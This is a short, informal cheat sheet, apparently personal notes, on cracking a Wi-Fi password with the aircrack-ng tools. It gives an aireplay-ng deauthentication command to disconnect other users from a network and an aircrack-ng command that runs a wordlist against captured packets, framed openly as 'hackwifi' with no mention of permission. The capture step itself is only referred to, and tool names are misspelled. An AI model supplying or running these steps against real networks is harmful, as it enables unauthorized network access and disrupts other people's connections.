// this will capture ivs packets  from the specified wifi,
// we are going to use the file to extract the password for the wifi
// use airdump-ng --help if you get confused.  

// for this to work, you will need to wait until someone connects to the wifi.
//to disconnect others from a wifi use aireplay-ng

aireplay-ng -0 1 -e [ESSID] [Wifi_interface]

//when someone have connected you can press "ctrl + C" to exit the shell.

//now you have a file at the root of the terminal window, move this file to a more suitable place.
// i would sugest desktop\hackwifi
// next step is to use aircrach-ng to crack it, this will iterate trough a wordlist to determine 
// to find a suitable wordlist, just search for "wordlist" in kali linux, it will direct you to a folder that has a few good ones.
// choose one, and copy it to "desktop\hackwifi"

aircrack-ng -w [path to wordlist] [path to the ivs file we created]
